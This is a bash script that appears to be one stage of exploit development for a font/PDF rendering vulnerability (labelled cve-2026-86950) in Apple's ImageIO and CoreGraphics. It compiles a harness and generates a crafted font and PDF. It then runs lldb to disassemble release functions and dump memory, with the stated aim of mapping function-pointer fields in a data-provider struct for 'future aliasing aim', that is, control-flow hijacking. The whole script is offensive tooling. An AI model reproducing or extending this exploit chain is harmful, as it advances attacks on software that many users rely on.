#!/bin/bash
# RIP-4: execute-surface bank — full disasm of release-chain fns + glyph alloc path.
# Goal: exact dp-struct offset map (which fields = fn ptrs) for future aliasing aim.
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python -c "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('k2_e64.ttf', 64)"
./venv/bin/python gen_pdf.py k2_e64.pdf k2_e64.ttf
{
  echo "breakpoint set -n data_release_info"
  echo "process launch -- k2_e64.pdf z.png"
  echo "disassemble --frame"
  echo "disassemble -n data_provider_finalize"
  echo "disassemble -n data_provider_retain_count"
  echo "disassemble -n CGGlyphBitmapCreateWithPathAndDilation_8"
  echo "register read x0 x1 x2"
  echo "memory read --size 8 --count 16 --format x \$x1-64"
  echo "quit"
} > cmdsF.txt
lldb -b -s cmdsF.txt ./render4 > sessF.txt 2>&1 || true
# blr/bl census in the disasm
grep -nE "blr|br " sessF.txt | head -30
grep -cE "ldr|str" sessF.txt || true
cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{sessF.txt,cmdsF.txt} findings/ 2>/dev/null
ls findings/ | wc -l
grep -E "blr" detonation/cve-2026-86950/sessF.txt | head -20
